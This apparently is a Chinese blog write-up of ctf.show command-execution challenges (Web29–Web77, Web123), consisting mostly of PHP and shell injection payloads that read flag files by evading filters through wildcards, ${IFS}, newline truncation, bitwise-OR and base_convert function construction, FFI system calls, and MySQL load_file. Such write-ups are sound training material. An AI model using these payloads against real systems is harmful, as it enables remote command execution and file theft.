---
title: Web29-124命令执行
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-07-26 16:18:52
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160485.png
---
命令执行就很有意思了~
简单的就不赘述了，可能对新手不太友好。

## Web29
    c=system('cat fla*');

## Web30
    c=echo `cat fl*`;

## Web31
    c=echo%09`tac%09fla*`%3B

## Web32
    c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

## Web33
	c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
    
## Web34
	c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

## Web35
    c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

## Web36
    c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

## Web37
    c=data://text/palin,<?php system('cat fl*');?>

## Web38
    c=data://text/plain,<?=system('cat fla*');?>

## Web39
	c=data://text/palin,<?php system('cat fl*');?>

## Web40
scandir(’.’):扫描当前目录
localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.
pos(),current():返回数组第一个值

c=print_r(scandir(pos(localeconv())));
查看目录

读flag

c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));

c=show_source(array_rand(array_flip(scandir(pos(localeconv())))));
先交换键值键名，然后随机返回。

最后一个方法很有意思

session_start(): 告诉PHP使用session;
session_id(): 获取到当前的session_id值；
手动设置cookie中PHPSESSID=flag.php；

http://f34e0b19-a97f-44d7-a3e5-9fcaf4913f00.challenge.ctf.show:8080/?c=session_start();system(session_id());

PHPSESSID=ls

## Web41
用或运算构造即可，脚本自己随便写一个就行。
要注意的是这边命令执行需要闭合和注释。

    c='|||||||||||');('%13%19%13%14%05%0D'|'%60%60%60%60%60%60')(('%03%01%14'|'%60%60%60').' '.('%06%0C%01%07%02%10%08%10'|'%60%60%60%60%2C%60%60%60'));//


## Web42
这条命令的意思就是在后台执行这个程序,并将错误输出2重定向到标准输出1,然后将标准输出1全部放到/dev/null文件,也就是清空.
所以可以看出" >/dev/null 2>&1 "常用来避免shell命令或者程序等运行中有内容输出。

截断即可
c=cat flag.php%0a

ps：%26以及||也能截断。
## Web43
c=tac flag.php%0A

## Web44
c=tac f*%0A

## Web45
c=tac%09f*%0A

## Web46
c=tac%09fl\ag.php%0A

## Web47
c=tac%09fl\ag.php%0A

## Web48
c=tac%09fl\ag.php%0A

## Web49
c=tac%09fl\ag.php%0A

## Web50
c=tac<>fl\ag.php%0A

## Web51
c=nl<>fl\ag.php%0A

## Web52
c=nl${IFS}/fl\ag%0A
注：flag.php是个假flag

## Web53
c=c''at${IFS}fl\ag.ph\p

## Web54
表达式 .* 就是单个字符匹配任意次，即贪婪匹配。比如caat、c\at、c''at等。
解决方法是直接调用bin目录下的命令
c=/bin/ca?${IFS}f???????

## Web55

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210716180736.png)

上传sh命令至tmp目录，然后用linux通配符匹配到对应文件
.代表source执行sh命令。

p牛：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell

也可以直接通配符
/???/????64 ????????       /bin/base64 flag.php
/???/???/????2 ????????     /usr/bin/bzip2 flag.php

## Web56
上题p神的解法。

## Web57
字母数字基本都没了，但是flag被换成了36，所以想办法构造36即可。
括号和$还在：
双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。
通俗地讲，就是将数学运算表达式放在((和))之间。
表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。
可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。
可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。
注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210716235018.png)

$(())是0
$((~$(()))) 0取反是-1
$((~-37))  -37取反是36
$(($((~$(())))$((~$(())))))  连起来默认相加是-2
所以37个-1连起来就行。

    $((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))

## Web58
c=highlight_file('flag.php');

## Web59
58的payload也行，其他姿势：

    c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
	//通过单一函数读取文件
	c=echo file_get_contents("flag.php");
	c=readfile("flag.php");
	c=var_dump(file('flag.php'));
	c=print_r(file('flag.php'));
	//这里做一个解释`file — 把整个文件读入一个数组中`
	通过fopen去读取文件内容，这里介绍下函数
	fread()
	fgets()
	fgetc()
	fgetss()
	fgetcsv()
	gpassthru()
	payload:
	c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
	c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
	c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
	
## Web60
	copy("flag.php","flag.txt");
	rename("flag.php","flag.txt");
	c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
	c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);print_r($line);}

## Web61

	c=highlight_file('flag.php');

## Web62

	c=highlight_file('flag.php');

## Web63

	c=highlight_file('flag.php');

## Web64

	c=highlight_file('flag.php');

## Web65

	c=highlight_file('flag.php');

## Web66

	c=highlight_file('/flag.txt');

## Web67

	c=highlight_file('/flag.txt');

## Web68
读目录

    var_dump(scandir('/'));
	c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}

第二个payload解释一下：
外部调用DirectoryIterator时，传入一个目录路径字符串，实例化DirectoryIterator类。
用foreach或者while遍历目录：

	<?php
	//遍历目录下的所有文件
	$dir = new DirectoryIterator(dirname(__FILE__));
	//1、foreach直接循环
	foreach ($dir as $file){
    	if($file->isFile()){
        	echo $file->getFilename()."<br />";
    	}
	}

glob:// 则是查找匹配的文件路径模式，glob:///*代表根目录下的所有文件。
最后输出直接echo $f也是可以的。

然后include即可。

## Web69

	include '/flag.txt';

## Web70

	include '/flag.txt';

## Web71

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210719104955.png)

	c=include '/flag.txt';exit();

提前结束

## Web72
这里没法直接读了，应该是设置了openbase_dir。
首先扫目录：

	c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();

然后include一下flag0.txt，g，又忘了设置了openbase。
蚁剑试一下。
蚁剑也g了。

看了下师傅们的博客，用的是这个：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210719115025.png)

脚本网上都有

## Web73
flagc.txt

## Web74
flagx.txt

## Web75
利用mysql load_file读文件

    c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);

## Web76

    c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36d.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);

## Web77
https://www.php.cn/php-weizijiaocheng-415807.html

    c=$ffi = FFI::cdef("int system(const char *command);");$a='/readflag > 1.txt';$ffi->system($a);exit();

php>=7.4。

无语了。。。下面这部分放上去hexo就报错。。。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210726165017.png)

## Web123
老题了，通过数学函数构造命令。

抄yu22x师傅的博客了，写的很详细：

	base_convert(number,frombase,tobase);
	参数	描述
	number	    必需。规定要转换的数。
	frombase	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
	tobase	    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
	bindec — 二进制转换为十进制
	bindec ( string $binary_string ) : number
	decbin — 十进制转换为二进制
	decbin ( int $number ) : string
	dechex — 十进制转换为十六进制
	dechex ( int $number ) : string
	decoct — 十进制转换为八进制
	decoct ( int $number ) : string
	hexdec — 十六进制转换为十进制
	hexdec ( int $number ) : string

在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。
假设我们要构造出如下表达式

	c=$_GET[a]($_GET[b])&a=system&b=cat flag

我们需要构造的是其实只有 _GET，$我们可用使用，中括号可用用花括号代替，小括号也是可以使用的。这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。
那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。
我们发现36进制中包含了所有的数字和字母，所有只需要将hex2bin按照36进制转换成10进制就可以了。

	echo base_convert('hex2bin', 36, 10);
	结果  37907361743
	echo hexdec(bin2hex("_GET"));
	结果 1598506324

现在我们要做的就是反过来了
	
	base_convert('37907361743',10,36);    hex2bin
	
	base_convert('37907361743',10,36)(dechex('1598506324'));    _GET

	c=$pi=_GET;$$pi{abs}($$pi{acos})&abs=system&acos=tac f*

payload

	payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=tac f*

总结：hex2bin把16进制转字符，dechex把16进制转没有字符的十进制，这样便是全数字了。



